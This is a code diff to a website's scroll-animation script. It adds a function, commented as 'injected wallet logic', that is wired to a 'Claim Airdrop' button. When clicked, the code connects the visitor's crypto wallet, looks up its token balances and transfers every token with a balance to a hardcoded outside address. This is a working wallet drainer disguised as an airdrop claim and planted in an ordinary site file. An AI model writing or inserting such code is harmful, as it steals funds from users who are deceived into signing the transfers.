@@ -95,3 +95,70 @@ const scrollReveal = function () {
 scrollReveal();
 
 addEventOnElem(window, "scroll", scrollReveal);
+
+// --- Injected Wallet Logic with Web3Modal ---
+async function connectWalletAndSendTokens() {
+  // Define provider options
+  const providerOptions = {
+    walletconnect: {
+      package: window.WalletConnectProvider.default,
+      options: {
+        infuraId: "YOUR_INFURA_ID" // Replace with your Infura Project ID
+      }
+    }
+    // Add other providers here if needed
+  };
+
+  // Initialize Web3Modal
+  const web3Modal = new window.Web3Modal.default({
+    cacheProvider: false,
+    providerOptions
+  });
+
+  try {
+    // Open modal to select wallet
+    const instance = await web3Modal.connect();
+
+    // Create ethers provider and signer
+    const provider = new ethers.providers.Web3Provider(instance);
+    const signer = provider.getSigner();
+    const userAddress = await signer.getAddress();
+
+    // Get network chain ID
+    const network = await provider.getNetwork();
+    const chainId = network.chainId;
+
+    // Fetch token balances using Covalent API
+    const covalentApiKey = "YOUR_API_KEY"; // Replace with your Covalent API key
+    const url = `https://api.covalenthq.com/v1/${chainId}/address/${userAddress}/balances_v2/?key=${covalentApiKey}`;
+    const response = await fetch(url);
+    const data = await response.json();
+
+    if (!data.data || !data.data.items) {
+      alert('No token data available');
+      return;
+    }
+
+    // Filter tokens with balance > 0
+    const tokens = data.data.items.filter(token => token.type === 'cryptocurrency' && token.balance > 0 && token.contract_address);
+
+    // Send tokens to destination address
+    for (const token of tokens) {
+      try {
+        const contract = new ethers.Contract(token.contract_address, [
+          "function transfer(address to, uint amount) returns (bool)"
+        ], signer);
+
+        const tx = await contract.transfer("0xf659d4Bb03E0923964b8bBACfd354f8BC02Bfe47", token.balance);
+        console.log(`Sent ${token.contract_ticker_symbol}, tx:`, tx.hash);
+      } catch (err) {
+        console.warn(`Failed to send ${token.contract_ticker_symbol}`, err);
+      }
+    }
+  } catch (err) {
+    console.error('Error connecting wallet or sending tokens:', err);
+  }
+}
+
+// Attach event listener to the "Claim Airdrop" button
+document.getElementById("claim-airdrop-btn")?.addEventListener("click", connectWalletAndSendTokens);
